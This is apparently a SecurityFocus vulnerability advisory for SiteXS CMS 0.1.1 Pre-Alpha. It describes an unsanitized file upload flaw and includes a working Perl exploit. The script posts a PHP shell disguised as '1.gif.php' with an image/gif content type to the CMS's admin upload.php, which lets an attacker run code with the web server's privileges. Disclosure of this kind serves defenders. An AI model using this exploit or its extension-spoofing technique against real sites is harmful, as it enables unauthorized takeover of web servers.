source: http://www.securityfocus.com/bid/29029/info

SiteXS is prone to a vulnerability that lets remote attackers upload and execute arbitrary script code because the application fails to sanitize user-supplied input.

An attacker can leverage this issue to execute arbitrary code on an affected computer with the privileges of the webserver process.

SiteXS CMS 0.1.1 Pre-Alpha is vulnerable; other versions may also be affected. 

#!/usr/bin/perl
# Author : Hadi Kiamarsi
# Discover By : Hadi Kiamarsi
# Exploit By : Hadi Kiamarsi 
use LWP;
use HTTP::Request::Common;
$ua = $ua = LWP::UserAgent->new;;
$res = $ua->request(POST 'http:www.example.com/[sitexs]/adm/visual/upload.php',     
             Content_Type => 'form-data',
             Content => [
              UPLOAD => ["Your shell file path", "1.gif.php", "Content-Type" => 
"image/gif"],submit => 'true',type => 'images',path => '',process => 'true',
             ],
		    );
print $res->as_string();

